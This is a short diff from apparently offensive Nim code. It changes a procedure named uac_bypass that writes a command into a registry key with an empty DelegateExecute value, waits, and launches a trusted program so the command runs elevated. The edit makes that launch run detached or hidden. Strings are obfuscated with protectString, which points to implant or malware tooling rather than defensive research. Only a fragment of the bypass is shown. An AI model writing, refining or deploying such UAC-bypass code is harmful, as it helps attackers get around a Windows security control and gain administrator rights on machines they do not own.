@@ -460,7 +460,7 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
     
     if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
         sleep(2000)
-        if execCmdEx(launch).exitCode == 0:
+        if execCmdEx(launch, options={poDaemon}).exitCode == 0:
             is_success = true
 
     var data = {
